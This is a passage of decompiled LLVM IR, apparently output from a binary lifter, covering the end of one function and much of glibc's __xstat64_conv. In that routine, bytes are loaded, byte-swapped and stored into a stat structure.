bb:                                               ; preds = %dec_label_pc_1ba34
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_1ba34, %bb
  call void @__pseudo_cond_branch(i1 %v2_1ba34, i32 ptrtoint (i32* @global_var_1c0c8.1701 to i32))
  br label %dec_label_pc_1ba44

dec_label_pc_1ba44:                               ; preds = %dec_label_pc_1ba20, %.thread
  %v0_1ba44 = load i32, i32* %r4.global-to-local, align 4
  ret i32 %v0_1ba44

; uselistorder directives
  uselistorder i32 %v0_1ba10, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32 ()* @fstat, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1ba44, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__xstat64_conv(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  store i32 %arg2, i32* %r8.global-to-local, align 4
  store i32 %tmp, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 96, i32* @r2, align 4
  store i32 %arg2, i32* %r0.global-to-local, align 4
  %v2_1ba6c = inttoptr i32 %arg2 to i8*
  %v3_1ba6c = call i32 @__GI_memset(i8* %v2_1ba6c, i32 0)
  store i32 %v3_1ba6c, i32* %r0.global-to-local, align 4
  %v0_1ba70 = load i32, i32* %r4.global-to-local, align 4
  %v1_1ba70 = add i32 %v0_1ba70, 5
  %v2_1ba70 = inttoptr i32 %v1_1ba70 to i8*
  %v3_1ba70 = load i8, i8* %v2_1ba70, align 1
  %v4_1ba70 = zext i8 %v3_1ba70 to i32
  store i32 %v4_1ba70, i32* %r3.global-to-local, align 4
  %v1_1ba74 = add i32 %v0_1ba70, 1
  %v2_1ba74 = inttoptr i32 %v1_1ba74 to i8*
  %v3_1ba74 = load i8, i8* %v2_1ba74, align 1
  %v4_1ba74 = zext i8 %v3_1ba74 to i32
  %v1_1ba78 = add i32 %v0_1ba70, 4
  %v2_1ba78 = inttoptr i32 %v1_1ba78 to i8*
  %v3_1ba78 = load i8, i8* %v2_1ba78, align 1
  %v4_1ba78 = zext i8 %v3_1ba78 to i32
  %v1_1ba7c = inttoptr i32 %v0_1ba70 to i8*
  %v2_1ba7c = load i8, i8* %v1_1ba7c, align 1
  %v3_1ba7c = zext i8 %v2_1ba7c to i32
  %v1_1ba80 = add i32 %v0_1ba70, 2
  %v2_1ba80 = inttoptr i32 %v1_1ba80 to i8*
  %v3_1ba80 = load i8, i8* %v2_1ba80, align 1
  %v4_1ba80 = zext i8 %v3_1ba80 to i32
  %v1_1ba84 = add i32 %v0_1ba70, 6
  %v2_1ba84 = inttoptr i32 %v1_1ba84 to i8*
  %v3_1ba84 = load i8, i8* %v2_1ba84, align 1
  %v4_1ba84 = zext i8 %v3_1ba84 to i32
  %v3_1ba88 = mul nuw nsw i32 %v4_1ba70, 65536
  store i32 %v3_1ba88, i32* %r3.global-to-local, align 4
  %v3_1ba8c = mul nuw nsw i32 %v4_1ba74, 65536
  %v1_1ba90 = add i32 %v0_1ba70, 7
  %v2_1ba90 = inttoptr i32 %v1_1ba90 to i8*
  %v3_1ba90 = load i8, i8* %v2_1ba90, align 1
  %v4_1ba90 = zext i8 %v3_1ba90 to i32
  %v4_1ba94 = mul nuw i32 %v4_1ba78, 16777216
  %v5_1ba94 = or i32 %v4_1ba94, %v3_1ba88
  store i32 %v5_1ba94, i32* %r3.global-to-local, align 4
  %v4_1ba98 = mul nuw i32 %v3_1ba7c, 16777216
  %v5_1ba98 = or i32 %v4_1ba98, %v3_1ba8c
  %v1_1ba9c = add i32 %v0_1ba70, 3
  %v2_1ba9c = inttoptr i32 %v1_1ba9c to i8*
  %v3_1ba9c = load i8, i8* %v2_1ba9c, align 1
  %v4_1ba9c = zext i8 %v3_1ba9c to i32
  %v4_1baa0 = mul nuw nsw i32 %v4_1ba80, 256
  %v5_1baa0 = or i32 %v4_1baa0, %v5_1ba98
  %v4_1baa4 = mul nuw nsw i32 %v4_1ba84, 256
  %v5_1baa4 = or i32 %v4_1baa4, %v5_1ba94
  store i32 %v5_1baa4, i32* %r3.global-to-local, align 4
  %v2_1baa8 = or i32 %v4_1ba90, %v5_1baa4
  store i32 %v2_1baa8, i32* %r1.global-to-local, align 4
  %v2_1baac = or i32 %v4_1ba9c, %v5_1baa0
  store i32 %v2_1baac, i32* %r0.global-to-local, align 4
  %v0_1bab0 = load i32, i32* %r8.global-to-local, align 4
  %v1_1bab0 = inttoptr i32 %v0_1bab0 to i32*
  store i32 %v2_1baac, i32* %v1_1bab0, align 4
  %v3_1bab0 = add i32 %v0_1bab0, 4
  %v4_1bab0 = inttoptr i32 %v3_1bab0 to i32*
  %v5_1bab0 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_1bab0, i32* %v4_1bab0, align 4
  %v0_1bab4 = load i32, i32* %r4.global-to-local, align 4
  %v1_1bab4 = add i32 %v0_1bab4, 93
  %v2_1bab4 = inttoptr i32 %v1_1bab4 to i8*
  %v3_1bab4 = load i8, i8* %v2_1bab4, align 1
  %v4_1bab4 = zext i8 %v3_1bab4 to i32
  store i32 %v4_1bab4, i32* %r3.global-to-local, align 4
  %v1_1bab8 = add i32 %v0_1bab4, 89
  %v2_1bab8 = inttoptr i32 %v1_1bab8 to i8*
  %v3_1bab8 = load i8, i8* %v2_1bab8, align 1
  %v4_1bab8 = zext i8 %v3_1bab8 to i32
  %v1_1babc = add i32 %v0_1bab4, 92
  %v2_1babc = inttoptr i32 %v1_1babc to i8*
  %v3_1babc = load i8, i8* %v2_1babc, align 1
  %v4_1babc = zext i8 %v3_1babc to i32
  store i32 %v4_1babc, i32* %r1.global-to-local, align 4
  %v1_1bac0 = add i32 %v0_1bab4, 88
  %v2_1bac0 = inttoptr i32 %v1_1bac0 to i8*
  %v3_1bac0 = load i8, i8* %v2_1bac0, align 1
  %v4_1bac0 = zext i8 %v3_1bac0 to i32
  %v1_1bac4 = add i32 %v0_1bab4, 94
  %v2_1bac4 = inttoptr i32 %v1_1bac4 to i8*
  %v3_1bac4 = load i8, i8* %v2_1bac4, align 1
  %v4_1bac4 = zext i8 %v3_1bac4 to i32
  %v1_1bac8 = add i32 %v0_1bab4, 90
  %v2_1bac8 = inttoptr i32 %v1_1bac8 to i8*
  %v3_1bac8 = load i8, i8* %v2_1bac8, align 1
  %v4_1bac8 = zext i8 %v3_1bac8 to i32
  %v3_1bacc = mul nuw nsw i32 %v4_1bab4, 65536
  store i32 %v3_1bacc, i32* %r3.global-to-local, align 4
  %v3_1bad0 = mul nuw nsw i32 %v4_1bab8, 65536
  %v1_1bad4 = add i32 %v0_1bab4, 95
  %v2_1bad4 = inttoptr i32 %v1_1bad4 to i8*
  %v3_1bad4 = load i8, i8* %v2_1bad4, align 1
  %v4_1bad4 = zext i8 %v3_1bad4 to i32
  store i32 %v4_1bad4, i32* %r0.global-to-local, align 4
  %v4_1bad8 = mul nuw i32 %v4_1babc, 16777216
  %v5_1bad8 = or i32 %v4_1bad8, %v3_1bacc
  store i32 %v5_1bad8, i32* %r3.global-to-local, align 4
  %v4_1badc = mul nuw i32 %v4_1bac0, 16777216
  %v5_1badc = or i32 %v4_1badc, %v3_1bad0
  %v1_1bae0 = add i32 %v0_1bab4, 91
  %v2_1bae0 = inttoptr i32 %v1_1bae0 to i8*
  %v3_1bae0 = load i8, i8* %v2_1bae0, align 1
  %v4_1bae0 = zext i8 %v3_1bae0 to i32
  store i32 %v4_1bae0, i32* %r1.global-to-local, align 4
  %v4_1bae4 = mul nuw nsw i32 %v4_1bac4, 256
  %v5_1bae4 = or i32 %v4_1bae4, %v5_1bad8
  store i32 %v5_1bae4, i32* %r3.global-to-local, align 4
  %v4_1bae8 = mul nuw nsw i32 %v4_1bac8, 256
  %v5_1bae8 = or i32 %v4_1bae8, %v5_1badc
  %v2_1baec = or i32 %v4_1bae0, %v5_1bae8
  %v2_1baf0 = or i32 %v4_1bad4, %v5_1bae4
  store i32 %v2_1baf0, i32* %r6.global-to-local, align 4
  %v1_1baf4 = load i32, i32* %r8.global-to-local, align 4
  %v2_1baf4 = add i32 %v1_1baf4, 88
  %v3_1baf4 = inttoptr i32 %v2_1baf4 to i32*
  store i32 %v2_1baec, i32* %v3_1baf4, align 4
  %v0_1baf8 = load i32, i32* %r6.global-to-local, align 4
  %v1_1baf8 = load i32, i32* %r8.global-to-local, align 4
  %v2_1baf8 = add i32 %v1_1baf8, 92
  %v3_1baf8 = inttoptr i32 %v2_1baf8 to i32*
  store i32 %v0_1baf8, i32* %v3_1baf8, align 4
  %v0_1bafc = load i32, i32* %r4.global-to-local, align 4
  %v1_1bafc = add i32 %v0_1bafc, 13
  %v2_1bafc = inttoptr i32 %v1_1bafc to i8*
  %v3_1bafc = load i8, i8* %v2_1bafc, align 1
  %v4_1bafc = zext i8 %v3_1bafc to i32
  store i32 %v4_1bafc, i32* %r3.global-to-local, align 4
  %v1_1bb00 = add i32 %v0_1bafc, 12
  %v2_1bb00 = inttoptr i32 %v1_1bb00 to i8*
  %v3_1bb00 = load i8, i8* %v2_1bb00, align 1
  %v4_1bb00 = zext i8 %v3_1bb00 to i32
  %v1_1bb04 = add i32 %v0_1bafc, 14
  %v2_1bb04 = inttoptr i32 %v1_1bb04 to i8*
  %v3_1bb04 = load i8, i8* %v2_1bb04, align 1
  %v4_1bb04 = zext i8 %v3_1bb04 to i32
  store i32 %v4_1bb04, i32* %r1.global-to-local, align 4
  %v3_1bb08 = mul nuw nsw i32 %v4_1bafc, 65536
  %v4_1bb0c = mul nuw i32 %v4_1bb00, 16777216
  %v5_1bb0c = or i32 %v4_1bb0c, %v3_1bb08
  store i32 %v5_1bb0c, i32* %r3.global-to-local, align 4
  %v1_1bb10 = add i32 %v0_1bafc, 15
  %v2_1bb10 = inttoptr i32 %v1_1bb10 to i8*
  %v3_1bb10 = load i8, i8* %v2_1bb10, align 1
  %v4_1bb10 = zext i8 %v3_1bb10 to i32
  %v4_1bb14 = mul nuw nsw i32 %v4_1bb04, 256
  %v5_1bb14 = or i32 %v4_1bb14, %v5_1bb0c
  store i32 %v5_1bb14, i32* %r3.global-to-local, align 4
  %v2_1bb18 = or i32 %v4_1bb10, %v5_1bb14
  %v1_1bb1c = load i32, i32* %r8.global-to-local, align 4
  %v2_1bb1c = add i32 %v1_1bb1c, 12
  %v3_1bb1c = inttoptr i32 %v2_1bb1c to i32*
  store i32 %v2_1bb18, i32* %v3_1bb1c, align 4
  %v0_1bb20 = load i32, i32* %r4.global-to-local, align 4
  %v1_1bb20 = add i32 %v0_1bb20, 17
  %v2_1bb20 = inttoptr i32 %v1_1bb20 to i8*
  %v3_1bb20 = load i8, i8* %v2_1bb20, align 1
  %v4_1bb20 = zext i8 %v3_1bb20 to i32
  store i32 %v4_1bb20, i32* %r3.global-to-local, align 4
  %v1_1bb24 = add i32 %v0_1bb20, 16
  %v2_1bb24 = inttoptr i32 %v1_1bb24 to i8*
  %v3_1bb24 = load i8, i8* %v2_1bb24, align 1
  %v4_1bb24 = zext i8 %v3_1bb24 to i32
  %v1_1bb28 = add i32 %v0_1bb20, 18
  %v2_1bb28 = inttoptr i32 %v1_1bb28 to i8*
  %v3_1bb28 = load i8, i8* %v2_1bb28, align 1
  %v4_1bb28 = zext i8 %v3_1bb28 to i32
  store i32 %v4_1bb28, i32* %r1.global-to-local, align 4
  %v3_1bb2c = mul nuw nsw i32 %v4_1bb20, 65536
  %v4_1bb30 = mul nuw i32 %v4_1bb24, 16777216
  %v5_1bb30 = or i32 %v4_1bb30, %v3_1bb2c
  store i32 %v5_1bb30, i32* %r3.global-to-local, align 4
  %v1_1bb34 = add i32 %v0_1bb20, 19
  %v2_1bb34 = inttoptr i32 %v1_1bb34 to i8*
  %v3_1bb34 = load i8, i8* %v2_1bb34, align 1
  %v4_1bb34 = zext i8 %v3_1bb34 to i32
  %v4_1bb38 = mul nuw nsw i32 %v4_1bb28, 256
  %v5_1bb38 = or i32 %v4_1bb38, %v5_1bb30
  store i32 %v5_1bb38, i32* %r3.global-to-local, align 4
  %v2_1bb3c = or i32 %v4_1bb34, %v5_1bb38
  %v1_1bb40 = load i32, i32* %r8.global-to-local, align 4
  %v2_1bb40 = add i32 %v1_1bb40, 16
  %v3_1bb40 = inttoptr i32 %v2_1bb40 to i32*
  store i32 %v2_1bb3c, i32* %v3_1bb40, align 4
  %v0_1bb44 = load i32, i32* %r4.global-to-local, align 4
  %v1_1bb44 = add i32 %v0_1bb44, 21
  %v2_1bb44 = inttoptr i32 %v1_1bb44 to i8*
  %v3_1bb44 = load i8, i8* %v2_1bb44, align 1
  %v4_1bb44 = zext i8 %v3_1bb44 to i32
  store i32 %v4_1bb44, i32* %r3.global-to-local, align 4
  %v1_1bb48 = add i32 %v0_1bb44, 20
  %v2_1bb48 = inttoptr i32 %v1_1bb48 to i8*
  %v3_1bb48 = load i8, i8* %v2_1bb48, align 1
  %v4_1bb48 = zext i8 %v3_1bb48 to i32
  %v1_1bb4c = add i32 %v0_1bb44, 22
  %v2_1bb4c = inttoptr i32 %v1_1bb4c to i8*
  %v3_1bb4c = load i8, i8* %v2_1bb4c, align 1
  %v4_1bb4c = zext i8 %v3_1bb4c to i32
  store i32 %v4_1bb4c, i32* %r1.global-to-local, align 4
  %v3_1bb50 = mul nuw nsw i32 %v4_1bb44, 65536
  %v4_1bb54 = mul nuw i32 %v4_1bb48, 16777216
  %v5_1bb54 = or i32 %v4_1bb54, %v3_1bb50
  store i32 %v5_1bb54, i32* %r3.global-to-local, align 4
  %v1_1bb58 = add i32 %v0_1bb44, 23
  %v2_1bb58 = inttoptr i32 %v1_1bb58 to i8*
  %v3_1bb58 = load i8, i8* %v2_1bb58, align 1
  %v4_1bb58 = zext i8 %v3_1bb58 to i32
  %v4_1bb5c = mul nuw nsw i32 %v4_1bb4c, 256
  %v5_1bb5c = or i32 %v4_1bb5c, %v5_1bb54
  store i32 %v5_1bb5c, i32* %r3.global-to-local, align 4
  %v2_1bb60 = or i32 %v4_1bb58, %v5_1bb5c
  %v1_1bb64 = load i32, i32* %r8.global-to-local, align 4
  %v2_1bb64 = add i32 %v1_1bb64, 20
  %v3_1bb64 = inttoptr i32 %v2_1bb64 to i32*
  store i32 %v2_1bb60, i32* %v3_1bb64, align 4
  %v0_1bb68 = load i32, i32* %r4.global-to-local, align 4
  %v1_1bb68 = add i32 %v0_1bb68, 25
  %v2_1bb68 = inttoptr i32 %v1_1bb68 to i8*
  %v3_1bb68 = load i8, i8* %v2_1bb68, align 1
  %v4_1bb68 = zext i8 %v3_1bb68 to i32
  store i32 %v4_1bb68, i32* %r3.global-to-local, align 4
  %v1_1bb6c = add i32 %v0_1bb68, 24
  %v2_1bb6c = inttoptr i32 %v1_1bb6c to i8*
  %v3_1bb6c = load i8, i8* %v2_1bb6c, align 1
  %v4_1bb6c = zext i8 %v3_1bb6c to i32
  %v1_1bb70 = add i32 %v0_1bb68, 26
  %v2_1bb70 = inttoptr i32 %v1_1bb70 to i8*
  %v3_1bb70 = load i8, i8* %v2_1bb70, align 1
  %v4_1bb70 = zext i8 %v3_1bb70 to i32
  store i32 %v4_1bb70, i32* %r1.global-to-local, align 4
  %v3_1bb74 = mul nuw nsw i32 %v4_1bb68, 65536
  %v4_1bb78 = mul nuw i32 %v4_1bb6c, 16777216
  %v5_1bb78 = or i32 %v4_1bb78, %v3_1bb74
  store i32 %v5_1bb78, i32* %r3.global-to-local, align 4
  %v1_1bb7c = add i32 %v0_1bb68, 27
  %v2_1bb7c = inttoptr i32 %v1_1bb7c to i8*
  %v3_1bb7c = load i8, i8* %v2_1bb7c, align 1
  %v4_1bb7c = zext i8 %v3_1bb7c to i32
  %v4_1bb80 = mul nuw nsw i32 %v4_1bb70, 256
  %v5_1bb80 = or i32 %v4_1bb80, %v5_1bb78
  store i32 %v5_1bb80, i32* %r3.global-to-local, align 4
  %v2_1bb84 = or i32 %v4_1bb7c, %v5_1bb80
  %v1_1bb88 = load i32, i32* %r8.global-to-local, align 4
  %v2_1bb88 = add i32 %v1_1bb88, 24
  %v3_1bb88 = inttoptr i32 %v2_1bb88 to i32*
  store i32 %v2_1bb84, i32* %v3_1bb88, align 4
  %v0_1bb8c = load i32, i32* %r4.global-to-local, align 4
  %v1_1bb8c = add i32 %v0_1bb8c, 29
  %v2_1bb8c = inttoptr i32 %v1_1bb8c to i8*
  %v3_1bb8c = load i8, i8* %v2_1bb8c, align 1
  %v4_1bb8c = zext i8 %v3_1bb8c to i32
  store i32 %v4_1bb8c, i32* %r3.global-to-local, align 4
  %v1_1bb90 = add i32 %v0_1bb8c, 28
  %v2_1bb90 = inttoptr i32 %v1_1bb90 to i8*
  %v3_1bb90 = load i8, i8* %v2_1bb90, align 1
  %v4_1bb90 = zext i8 %v3_1bb90 to i32
  %v1_1bb94 = add i32 %v0_1bb8c, 30
  %v2_1bb94 = inttoptr i32 %v1_1bb94 to i8*
  %v3_1bb94 = load i8, i8* %v2_1bb94, align 1
  %v4_1bb94 = zext i8 %v3_1bb94 to i32
  store i32 %v4_1bb94, i32* %r1.global-to-local, align 4
  %v3_1bb98 = mul nuw nsw i32 %v4_1bb8c, 65536
  %v4_1bb9c = mul nuw i32 %v4_1bb90, 16777216
  %v5_1bb9c = or i32 %v4_1bb9c, %v3_1bb98
  store i32 %v5_1bb9c, i32* %r3.global-to-local, align 4
  %v1_1bba0 = add i32 %v0_1bb8c, 31
  %v2_1bba0 = inttoptr i32 %v1_1bba0 to i8*
  %v3_1bba0 = load i8, i8* %v2_1bba0, align 1
  %v4_1bba0 = zext i8 %v3_1bba0 to i32
  %v4_1bba4 = mul nuw nsw i32 %v4_1bb94, 256
  %v5_1bba4 = or i32 %v4_1bba4, %v5_1bb9c
  store i32 %v5_1bba4, i32* %r3.global-to-local, align 4
  %v2_1bba8 = or i32 %v4_1bba0, %v5_1bba4
  %v1_1bbac = load i32, i32* %r8.global-to-local, align 4
  %v2_1bbac = add i32 %v1_1bbac, 28
  %v3_1bbac = inttoptr i32 %v2_1bbac to i32*
  store i32 %v2_1bba8, i32* %v3_1bbac, align 4
  %v0_1bbb0 = load i32, i32* %r4.global-to-local, align 4
  %v1_1bbb0 = add i32 %v0_1bbb0, 37
  %v2_1bbb0 = inttoptr i32 %v1_1bbb0 to i8*
  %v3_1bbb0 = load i8, i8* %v2_1bbb0, align 1
  %v4_1bbb0 = zext i8 %v3_1bbb0 to i32
  store i32 %v4_1bbb0, i32* %r3.global-to-local, align 4
  %v1_1bbb4 = add i32 %v0_1bbb0, 33
  %v2_1bbb4 = inttoptr i32 %v1_1bbb4 to i8*
  %v3_1bbb4 = load i8, i8* %v2_1bbb4, align 1
  %v4_1bbb4 = zext i8 %v3_1bbb4 to i32
  %v1_1bbb8 = add i32 %v0_1bbb0, 36
  %v2_1bbb8 = inttoptr i32 %v1_1bbb8 to i8*
  %v3_1bbb8 = load i8, i8* %v2_1bbb8, align 1
  %v4_1bbb8 = zext i8 %v3_1bbb8 to i32
  store i32 %v4_1bbb8, i32* %r1.global-to-local, align 4
  %v1_1bbbc = add i32 %v0_1bbb0, 32
  %v2_1bbbc = inttoptr i32 %v1_1bbbc to i8*
  %v3_1bbbc = load i8, i8* %v2_1bbbc, align 1
  %v4_1bbbc = zext i8 %v3_1bbbc to i32
  %v1_1bbc0 = add i32 %v0_1bbb0, 38
  %v2_1bbc0 = inttoptr i32 %v1_1bbc0 to i8*
  %v3_1bbc0 = load i8, i8* %v2_1bbc0, align 1
  %v4_1bbc0 = zext i8 %v3_1bbc0 to i32
  %v1_1bbc4 = add i32 %v0_1bbb0, 34
  %v2_1bbc4 = inttoptr i32 %v1_1bbc4 to i8*
  %v3_1bbc4 = load i8, i8* %v2_1bbc4, align 1
  %v4_1bbc4 = zext i8 %v3_1bbc4 to i32
  %v3_1bbc8 = mul nuw nsw i32 %v4_1bbb0, 65536
  store i32 %v3_1bbc8, i32* %r3.global-to-local, align 4
  %v3_1bbcc = mul nuw nsw i32 %v4_1bbb4, 65536
  %v1_1bbd0 = add i32 %v0_1bbb0, 39
  %v2_1bbd0 = inttoptr i32 %v1_1bbd0 to i8*
  %v3_1bbd0 = load i8, i8* %v2_1bbd0, align 1
  %v4_1bbd0 = zext i8 %v3_1bbd0 to i32
  store i32 %v4_1bbd0, i32* %r0.global-to-local, align 4
  %v4_1bbd4 = mul nuw i32 %v4_1bbb8, 16777216
  %v5_1bbd4 = or i32 %v4_1bbd4, %v3_1bbc8
  store i32 %v5_1bbd4, i32* %r3.global-to-local, align 4
  %v4_1bbd8 = mul nuw i32 %v4_1bbbc, 16777216
  %v5_1bbd8 = or i32 %v4_1bbd8, %v3_1bbcc
  %v1_1bbdc = add i32 %v0_1bbb0, 35
  %v2_1bbdc = inttoptr i32 %v1_1bbdc to i8*
  %v3_1bbdc = load i8, i8* %v2_1bbdc, align 1
  %v4_1bbdc = zext i8 %v3_1bbdc to i32
  %v4_1bbe0 = mul nuw nsw i32 %v4_1bbc0, 256
  %v5_1bbe0 = or i32 %v4_1bbe0, %v5_1bbd4
  %v4_1bbe4 = mul nuw nsw i32 %v4_1bbc4, 256
  %v5_1bbe4 = or i32 %v4_1bbe4, %v5_1bbd8
  %v2_1bbe8 = or i32 %v5_1bbe0, %v4_1bbd0
  store i32 %v2_1bbe8, i32* %r0.global-to-local, align 4
  %v2_1bbec = or i32 %v5_1bbe4, %v4_1bbdc
  store i32 %v2_1bbec, i32* %r1.global-to-local, align 4
  store i32 %v2_1bbe8, i32* %r3.global-to-local, align 4
  %v1_1bc00 = load i32, i32* %r8.global-to-local, align 4
  %v2_1bc00 = add i32 %v1_1bc00, 32
  %v3_1bc00 = inttoptr i32 %v2_1bc00 to i32*
  store i32 %v2_1bbec, i32* %v3_1bc00, align 4
  %v0_1bc04 = load i32, i32* %r3.global-to-local, align 4
  %v1_1bc04 = load i32, i32* %r8.global-to-local, align 4
  %v2_1bc04 = add i32 %v1_1bc04, 36
  %v3_1bc04 = inttoptr i32 %v2_1bc04 to i32*
  store i32 %v0_1bc04, i32* %v3_1bc04, align 4
  %v0_1bc08 = load i32, i32* %r4.global-to-local, align 4
  %v1_1bc08 = add i32 %v0_1bc08, 49
  %v2_1bc08 = inttoptr i32 %v1_1bc08 to i8*
  %v3_1bc08 = load i8, i8* %v2_1bc08, align 1
  %v4_1bc08 = zext i8 %v3_1bc08 to i32
  store i32 %v4_1bc08, i32* %r3.global-to-local, align 4
  %v1_1bc0c = add i32 %v0_1bc08, 45
  %v2_1bc0c = inttoptr i32 %v1_1bc0c to i8*
  %v3_1bc0c = load i8, i8* %v2_1bc0c, align 1
  %v4_1bc0c = zext i8 %v3_1bc0c to i32
  %v1_1bc10 = add i32 %v0_1bc08, 48
  %v2_1bc10 = inttoptr i32 %v1_1bc10 to i8*
  %v3_1bc10 = load i8, i8* %v2_1bc10, align 1
  %v4_1bc10 = zext i8 %v3_1bc10 to i32
  store i32 %v4_1bc10, i32* %r1.global-to-local, align 4
  %v1_1bc14 = add i32 %v0_1bc08, 44
  %v2_1bc14 = inttoptr i32 %v1_1bc14 to i8*
  %v3_1bc14 = load i8, i8* %v2_1bc14, align 1
  %v4_1bc14 = zext i8 %v3_1bc14 to i32
  %v1_1bc18 = add i32 %v0_1bc08, 50
  %v2_1bc18 = inttoptr i32 %v1_1bc18 to i8*
  %v3_1bc18 = load i8, i8* %v2_1bc18, align 1
  %v4_1bc18 = zext i8 %v3_1bc18 to i32
  %v1_1bc1c = add i32 %v0_1bc08, 46
  %v2_1bc1c = inttoptr i32 %v1_1bc1c to i8*
  %v3_1bc1c = load i8, i8* %v2_1bc1c, align 1
  %v4_1bc1c = zext i8 %v3_1bc1c to i32
  %v3_1bc20 = mul nuw nsw i32 %v4_1bc08, 65536
  store i32 %v3_1bc20, i32* %r3.global-to-local, align 4
  %v3_1bc24 = mul nuw nsw i32 %v4_1bc0c, 65536
  %v1_1bc28 = add i32 %v0_1bc08, 51
  %v2_1bc28 = inttoptr i32 %v1_1bc28 to i8*
  %v3_1bc28 = load i8, i8* %v2_1bc28, align 1
  %v4_1bc28 = zext i8 %v3_1bc28 to i32
  store i32 %v4_1bc28, i32* %r0.global-to-local, align 4
  %v4_1bc2c = mul nuw i32 %v4_1bc10, 16777216
  %v5_1bc2c = or i32 %v4_1bc2c, %v3_1bc20
  store i32 %v5_1bc2c, i32* %r3.global-to-local, align 4
  %v4_1bc30 = mul nuw i32 %v4_1bc14, 16777216
  %v5_1bc30 = or i32 %v4_1bc30, %v3_1bc24
  %v1_1bc34 = add i32 %v0_1bc08, 47
  %v2_1bc34 = inttoptr i32 %v1_1bc34 to i8*
  %v3_1bc34 = load i8, i8* %v2_1bc34, align 1
  %v4_1bc34 = zext i8 %v3_1bc34 to i32
  %v4_1bc38 = mul nuw nsw i32 %v4_1bc18, 256
  %v5_1bc38 = or i32 %v4_1bc38, %v5_1bc2c
  %v4_1bc3c = mul nuw nsw i32 %v4_1bc1c, 256
  %v5_1bc3c = or i32 %v4_1bc3c, %v5_1bc30
  %v2_1bc40 = or i32 %v5_1bc38, %v4_1bc28
  store i32 %v2_1bc40, i32* %r0.global-to-local, align 4
  %v2_1bc44 = or i32 %v5_1bc3c, %v4_1bc34
  store i32 %v2_1bc44, i32* %r1.global-to-local, align 4
  store i32 %v2_1bc40, i32* %r3.global-to-local, align 4
  %v1_1bc58 = load i32, i32* %r8.global-to-local, align 4
  %v2_1bc58 = add i32 %v1_1bc58, 44
  %v3_1bc58 = inttoptr i32 %v2_1bc58 to i32*
  store i32 %v2_1bc44, i32* %v3_1bc58, align 4
  %v0_1bc5c = load i32, i32* %r3.global-to-local, align 4
  %v1_1bc5c = load i32, i32* %r8.global-to-local, align 4
  %v2_1bc5c = add i32 %v1_1bc5c, 48
  %v3_1bc5c = inttoptr i32 %v2_1bc5c to i32*
  store i32 %v0_1bc5c, i32* %v3_1bc5c, align 4
  %v0_1bc60 = load i32, i32* %r4.global-to-local, align 4
  %v1_1bc60 = add i32 %v0_1bc60, 53
  %v2_1bc60 = inttoptr i32 %v1_1bc60 to i8*
  %v3_1bc60 = load i8, i8* %v2_1bc60, align 1
  %v4_1bc60 = zext i8 %v3_1bc60 to i32
  store i32 %v4_1bc60, i32* %r3.global-to-local, align 4
  %v1_1bc64 = add i32 %v0_1bc60, 52
  %v2_1bc64 = inttoptr i32 %v1_1bc64 to i8*
  %v3_1bc64 = load i8, i8* %v2_1bc64, align 1
  %v4_1bc64 = zext i8 %v3_1bc64 to i32
  %v1_1bc68 = add i32 %v0_1bc60, 54
  %v2_1bc68 = inttoptr i32 %v1_1bc68 to i8*
  %v3_1bc68 = load i8, i8* %v2_1bc68, align 1
  %v4_1bc68 = zext i8 %v3_1bc68 to i32
  store i32 %v4_1bc68, i32* %r1.global-to-local, align 4
  %v3_1bc6c = mul nuw nsw i32 %v4_1bc60, 65536
  %v4_1bc70 = mul nuw i32 %v4_1bc64, 16777216
  %v5_1bc70 = or i32 %v4_1bc70, %v3_1bc6c
  store i32 %v5_1bc70, i32* %r3.global-to-local, align 4
  %v1_1bc74 = add i32 %v0_1bc60, 55
  %v2_1bc74 = inttoptr i32 %v1_1bc74 to i8*
  %v3_1bc74 = load i8, i8* %v2_1bc74, align 1
  %v4_1bc74 = zext i8 %v3_1bc74 to i32
  %v4_1bc78 = mul nuw nsw i32 %v4_1bc68, 256
  %v5_1bc78 = or i32 %v4_1bc78, %v5_1bc70
  store i32 %v5_1bc78, i32* %r3.global-to-local, align 4
  %v2_1bc7c = or i32 %v4_1bc74, %v5_1bc78
  %v1_1bc80 = load i32, i32* %r8.global-to-local, align 4
  %v2_1bc80 = add i32 %v1_1bc80, 52
  %v3_1bc80 = inttoptr i32 %v2_1bc80 to i32*
  store i32 %v2_1bc7c, i32* %v3_1bc80, align 4
  %v0_1bc84 = load i32, i32* %r4.global-to-local, align 4
  %v1_1bc84 = add i32 %v0_1bc84, 61
  %v2_1bc84 = inttoptr i32 %v1_1bc84 to i8*
  %v3_1bc84 = load i8, i8* %v2_1bc84, align 1
  %v4_1bc84 = zext i8 %v3_1bc84 to i32
  store i32 %v4_1bc84, i32* %r3.global-to-local, align 4
  %v1_1bc88 = add i32 %v0_1bc84, 57
  %v2_1bc88 = inttoptr i32 %v1_1bc88 to i8*
  %v3_1bc88 = load i8, i8* %v2_1bc88, align 1
  %v4_1bc88 = zext i8 %v3_1bc88 to i32
  %v1_1bc8c = add i32 %v0_1bc84, 60
  %v2_1bc8c = inttoptr i32 %v1_1bc8c to i8*
  %v3_1bc8c = load i8, i8* %v2_1bc8c, align 1
  %v4_1bc8c = zext i8 %v3_1bc8c to i32
  store i32 %v4_1bc8c, i32* %r1.global-to-local, align 4
  %v1_1bc90 = add i32 %v0_1bc84, 56
  %v2_1bc90 = inttoptr i32 %v1_1bc90 to i8*
  %v3_1bc90 = load i8, i8* %v2_1bc90, align 1
  %v4_1bc90 = zext i8 %v3_1bc90 to i32
  %v1_1bc94 = add i32 %v0_1bc84, 62
  %v2_1bc94 = inttoptr i32 %v1_1bc94 to i8*
  %v3_1bc94 = load i8, i8* %v2_1bc94, align 1
  %v4_1bc94 = zext i8 %v3_1bc94 to i32
  %v1_1bc98 = add i32 %v0_1bc84, 58
  %v2_1bc98 = inttoptr i32 %v1_1bc98 to i8*
